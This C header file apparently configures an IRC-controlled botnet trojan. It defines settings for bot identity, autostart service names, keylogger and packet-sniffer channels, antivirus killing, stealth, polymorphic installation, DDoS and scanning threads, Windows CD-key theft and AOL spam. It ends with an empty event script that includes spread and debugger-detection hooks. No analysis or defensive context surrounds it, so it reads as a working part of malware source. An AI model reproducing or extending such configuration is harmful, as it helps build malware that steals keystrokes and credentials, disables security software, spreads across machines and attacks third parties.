#ifndef __CONFIG_H__
#define __CONFIG_H__

#include "confbase.h"

// The section name for polymorph
#define SECTION_NAME ".cukentf"

// Array of CVars
conf_cvar g_aCVars[] = {
	{	"bot_filename",	"",	"93KMa3CI4O024An9",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"bot_id",	"",	"ca0rwWhdbCQ5on4d",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"bot_prefix",	"",	NULL,	""	},
	{	"bot_timeout",	"0",	NULL,	""	},
	{	"bot_seclogin",	"false",	NULL,	""	},
	{	"bot_compnick",	"false",	NULL,	""	},
	{	"bot_randnick",	"false",	NULL,	""	},
	{	"bot_meltserver",	"false",	NULL,	""	},
	{	"bot_topiccmd",	"false",	NULL,	""	},
	{	"do_speedtest",	"false",	NULL,	""	},
	{	"do_avkill",	"false",	NULL,	""	},
	{	"do_stealth",	"false",	NULL,	""	},
	{	"as_valname",	"",	"6Xf0zb5C47yHu1uK",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"as_enabled",	"false",	NULL,	""	},
	{	"as_service",	"false",	NULL,	""	},
	{	"as_service_name",	"",	"4A5S1GXPVLi7sR57",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"scan_maxthreads",	"0",	NULL,	""	},
	{	"scan_maxsockets",	"0",	NULL,	""	},
	{	"ddos_maxthreads",	"0",	NULL,	""	},
	{	"redir_maxthreads",	"0",	NULL,	""	},
	{	"identd_enabled",	"false",	NULL,	""	},
	{	"cdkey_windows",	"false",	NULL,	""	},
	{	"scaninfo_level",	"0",	NULL,	""	},
	{	"spam_aol_channel",	"",	"rG8u7thlSd2jox7u",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"spam_aol_enabled",	"false",	NULL,	""	},
	{	"sniffer_enabled",	"false",	NULL,	""	},
	{	"sniffer_channel",	"",	"4M11ztxUon3cfK7I",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"keylog_enabled",	"false",	NULL,	""	},
	{	"keylog_channel",	"",	"5lUVMIC233G3H7AS",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"scaninfo_chan",	"",	"gT9KQNkzWgAt94ZS",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"inst_polymorph",	"false",	NULL,	""	},
	{	"vuln_channel",	"",	"OA2Wme4gIs6nDsMk",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
};

// Array of Users
conf_user g_aUsers[] = {
};

// Array of Servers
conf_server g_aServers[] = {
};

// Script

char *g_szScript = \
	"onstart {\n" \
	"}\n" \
	"onconnect {\n" \
	"}\n" \
	"onjoin {\n" \
	"}\n" \
	"onlogin {\n" \
	"}\n" \
	"ondisconnect {\n" \
	"}\n" \
	"onremove {\n" \
	"}\n" \
	"onspread {\n" \
	"}\n" \
	"ondebugeractive {\n" \
	"}\n" \
	"ontimer 10080m {\n" \
	"}\n" \
	"onstartupfin {\n" \
	"}\n";

#endif // __CONFIG_H__
